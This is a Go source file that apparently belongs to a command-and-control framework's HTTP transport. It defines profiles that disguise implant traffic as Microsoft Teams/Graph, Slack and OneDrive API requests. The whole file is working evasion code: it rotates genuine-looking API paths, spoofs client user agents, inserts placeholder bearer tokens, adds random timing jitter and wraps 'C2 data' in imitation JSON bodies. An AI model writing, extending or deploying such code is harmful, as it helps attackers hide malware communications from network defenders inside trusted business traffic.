package http

import (
	"crypto/rand"
	"encoding/binary"
	"strings"
	"time"
)

type TrafficProfile struct {
	Name         string
	GetPaths     []string
	PostPaths    []string
	ContentTypes []string
	Headers      map[string]string
	UserAgents   []string
	JitterMinMs  int
	JitterMaxMs  int
	RequestWrap  string // JSON template with {DATA} placeholder for wrapping outgoing POST bodies
	ResponseWrap string // JSON template the server wraps responses in; {DATA} marks the C2 payload
}

var trafficProfiles = map[string]TrafficProfile{
	"teams": {
		Name: "Microsoft Teams / Graph API",
		GetPaths: []string{
			"/v1.0/me/chats",
			"/v1.0/me/messages",
			"/v1.0/me/presence",
			"/v1.0/me/joinedTeams",
			"/v1.0/me/calendar/events",
			"/v1.0/me/drive/recent",
			"/beta/me/notifications",
			"/v1.0/users",
		},
		PostPaths: []string{
			"/v1.0/me/sendMail",
			"/v1.0/me/messages",
			"/v1.0/me/events",
			"/v1.0/subscriptions",
			"/beta/me/presence/setPresence",
			"/v1.0/me/drive/items",
		},
		ContentTypes: []string{
			"application/json",
			"application/json; charset=utf-8",
		},
		Headers: map[string]string{
			"Authorization":    "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOi",
			"ConsistencyLevel": "eventual",
			"Prefer":           "outlook.body-content-type=\"text\"",
		},
		UserAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/24295.606.3238.6498 Chrome/120.0.6099.291 Electron/28.3.3 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Teams/24295.606.3238.6498 Chrome/120.0.6099.291 Electron/28.3.3 Safari/537.36",
		},
		JitterMinMs:  500,
		JitterMaxMs:  3000,
		RequestWrap:  `{"@odata.type":"#microsoft.graph.message","subject":"sync","body":{"contentType":"Text","content":"{DATA}"}}`,
		ResponseWrap: `{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#messages","value":[{"id":"AAMk","body":{"content":"{DATA}"}}]}`,
	},
	"slack": {
		Name: "Slack API",
		GetPaths: []string{
			"/api/conversations.list",
			"/api/conversations.history",
			"/api/users.list",
			"/api/channels.info",
			"/api/team.info",
			"/api/rtm.connect",
			"/api/files.list",
			"/api/emoji.list",
		},
		PostPaths: []string{
			"/api/chat.postMessage",
			"/api/chat.update",
			"/api/files.upload",
			"/api/reactions.add",
			"/api/conversations.mark",
			"/api/users.setPresence",
		},
		ContentTypes: []string{
			"application/json; charset=utf-8",
			"application/x-www-form-urlencoded",
		},
		Headers: map[string]string{
			"Authorization": "Bearer xoxb-",
		},
		UserAgents: []string{
			"Slackbot 1.0 (+https://api.slack.com/robots)",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Slack/4.38.125 Chrome/120.0.6099.291 Electron/28.3.3 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Slack/4.38.125 Chrome/120.0.6099.291 Electron/28.3.3 Safari/537.36",
		},
		JitterMinMs:  200,
		JitterMaxMs:  2000,
		RequestWrap:  `{"channel":"C0123456789","text":"{DATA}","unfurl_links":false}`,
		ResponseWrap: `{"ok":true,"channel":"C0123456789","ts":"1234567890.123456","message":{"text":"{DATA}"}}`,
	},
	"onedrive": {
		Name: "Microsoft OneDrive / SharePoint",
		GetPaths: []string{
			"/v1.0/me/drive/root/children",
			"/v1.0/me/drive/recent",
			"/v1.0/me/drive/sharedWithMe",
			"/v1.0/drives",
			"/v1.0/me/drive/items",
			"/v1.0/me/drive/root/delta",
			"/v1.0/sites/root",
		},
		PostPaths: []string{
			"/v1.0/me/drive/items",
			"/v1.0/me/drive/root/children",
			"/v1.0/me/drive/items/uploadSession",
			"/v1.0/subscriptions",
			"/v1.0/me/drive/root/search",
		},
		ContentTypes: []string{
			"application/json",
			"application/octet-stream",
			"multipart/form-data",
		},
		Headers: map[string]string{
			"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOi",
			"Prefer":        "respond-async",
		},
		UserAgents: []string{
			"OneDriveSyncEngine/24.215.1029.0002",
			"Microsoft SkyDriveSync 24.215.1029.0002 ship; Windows NT 10.0 (19045)",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		},
		JitterMinMs:  1000,
		JitterMaxMs:  5000,
		RequestWrap:  `{"item":{"@microsoft.graph.conflictBehavior":"rename","name":"sync.dat"},"content":"{DATA}"}`,
		ResponseWrap: `{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#drives","value":[{"id":"b!","content":"{DATA}"}]}`,
	},
}

func GetTrafficProfile(name string) *TrafficProfile {
	if p, ok := trafficProfiles[name]; ok {
		return &p
	}
	return nil
}

func ApplyTrafficProfile(h *HTTPProfile, profileName string) bool {
	profile := GetTrafficProfile(profileName)
	if profile == nil {
		return false
	}

	if len(profile.ContentTypes) > 0 {
		h.ContentTypes = profile.ContentTypes
	}

	if len(profile.UserAgents) > 0 {
		h.UserAgentPool = profile.UserAgents
		h.UserAgent = profile.UserAgents[0]
	}

	if h.CustomHeaders == nil {
		h.CustomHeaders = make(map[string]string)
	}
	for k, v := range profile.Headers {
		if _, exists := h.CustomHeaders[k]; !exists {
			h.CustomHeaders[k] = v
		}
	}

	if len(profile.GetPaths) > 0 {
		h.GetPaths = profile.GetPaths
	}
	if len(profile.PostPaths) > 0 {
		h.PostPaths = profile.PostPaths
	}

	h.RequestJitterMinMs = profile.JitterMinMs
	h.RequestJitterMaxMs = profile.JitterMaxMs

	h.RequestWrap = profile.RequestWrap
	h.ResponseWrap = profile.ResponseWrap

	return true
}

// RotatePath returns a path from the pool using round-robin, or falls back to
// the default endpoint if no profile paths are configured for this method.
func (h *HTTPProfile) RotatePath(method, defaultEndpoint string, cfg *sensitiveConfig) string {
	var pool []string
	if cfg != nil {
		if method == "GET" {
			pool = cfg.GetPaths
		} else {
			pool = cfg.PostPaths
		}
	} else {
		if method == "GET" {
			pool = h.GetPaths
		} else {
			pool = h.PostPaths
		}
	}

	if len(pool) == 0 {
		return defaultEndpoint
	}
	idx := h.pathIndex.Add(1) - 1
	return pool[idx%uint32(len(pool))]
}

// ApplyRequestJitter sleeps for a random duration within the profile's jitter
// range to simulate human browsing patterns. No-op if jitter is not configured.
func (h *HTTPProfile) ApplyRequestJitter(cfg *sensitiveConfig) {
	minMs := h.RequestJitterMinMs
	maxMs := h.RequestJitterMaxMs
	if cfg != nil {
		minMs = cfg.RequestJitterMinMs
		maxMs = cfg.RequestJitterMaxMs
	}

	if maxMs <= 0 {
		return
	}
	jitterRange := maxMs - minMs
	if jitterRange <= 0 {
		time.Sleep(time.Duration(minMs) * time.Millisecond)
		return
	}

	var buf [4]byte
	rand.Read(buf[:])
	n := int(binary.LittleEndian.Uint32(buf[:])) % jitterRange
	time.Sleep(time.Duration(minMs+n) * time.Millisecond)
}

// WrapRequest wraps outgoing C2 data in a JSON container that mimics the
// traffic profile's expected request format. Returns the original data if
// no request template is configured.
func WrapRequest(data []byte, template string) []byte {
	if template == "" {
		return data
	}
	return []byte(strings.Replace(template, "{DATA}", string(data), 1))
}

// UnwrapResponse extracts C2 data from a server response wrapped in the
// profile's response template. It finds the {DATA} placeholder position in
// the template and extracts the corresponding content from the response.
// Returns the original data if no response template is configured.
func UnwrapResponse(data []byte, template string) []byte {
	if template == "" {
		return data
	}

	marker := "{DATA}"
	idx := strings.Index(template, marker)
	if idx == -1 {
		return data
	}

	prefix := template[:idx]
	suffix := template[idx+len(marker):]

	s := string(data)
	start := strings.Index(s, prefix)
	if start == -1 {
		return data
	}
	start += len(prefix)

	if suffix == "" {
		return []byte(s[start:])
	}
	end := strings.Index(s[start:], suffix)
	if end == -1 {
		return data
	}
	return []byte(s[start : start+end])
}
